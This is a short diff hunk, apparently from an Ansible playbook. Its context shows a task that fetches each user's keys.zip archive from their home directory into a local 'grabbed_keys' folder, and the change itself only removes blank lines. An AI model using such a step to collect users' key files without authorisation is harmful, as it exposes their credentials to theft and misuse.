@@ -310,5 +310,3 @@
     src: "/home/{{ user.name }}/keys.zip"
     dest: "../grabbed_keys/{{ user.name }}.zip"
     flat: yes
-
-
